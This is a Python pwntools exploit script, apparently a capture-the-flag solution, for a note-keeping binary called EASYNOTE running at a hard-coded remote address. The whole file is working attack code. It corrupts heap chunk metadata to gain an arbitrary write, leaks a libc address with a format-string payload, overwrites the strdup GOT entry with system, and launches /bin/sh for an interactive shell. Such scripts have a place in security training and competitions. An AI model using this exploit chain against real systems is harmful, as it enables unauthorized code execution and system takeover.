#coding:utf8
from pwn import *
#context.log_level = 'debug'
debug = 0
elf = ELF('EASYNOTE')
if debug:
    sh = process('./EASYNOTE')
    libc = ELF('libc-2.23.so')
else:
    sh = remote('60.205.200.224', 10000)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx,size,data):
    sh.sendlineafter('choice>> ',str(1))
    sh.recvuntil('idx: ')
    sh.sendline(str(idx))
    sh.recvuntil('size: ')
    sh.sendline(str(size))
    sh.recvuntil('content: ')
    sh.send(str(data))

def edit(idx,data):
    sh.sendlineafter('choice>> ',str(2))
    sh.recvuntil('idx: ')
    sh.sendline(str(idx))
    sh.recvuntil('content: ')
    sh.send(str(data))
for i in range(24):
    add(0,0x90,'a'*0x90)

add(0,0x90,'a')
edit(0,'\x00'*0x18+p64(0xe1))
add(0,0x90,'a'*0x30)
add(1,0x90,'a'*0x88+p64(0x81))
edit(0,'b'*0x30+p64(0)+p64(0x81)+p64(0x602140))
add(0,0x90,'a'*0x70)
add(2,0x90,'c'*0x70+p64(0)*3+p64(0x81))
#gdb.attach(sh)
edit(2,'c'*0x70+p64(0x602068)+p64(0x90))
edit(0,p64(0x400700))

add(0,0x10,'%17$p')

libc_base = int(sh.recv(14),16) - libc.sym['__libc_start_main'] - 240
#0x20840
print hex(libc_base)
edit(2,'c'*0x70+p64(elf.got['strdup'])+p64(0x90))
edit(0,p64(libc_base+libc.symbols['system']))
add(0,0x10,'/bin/sh\x00')
sh.interactive()
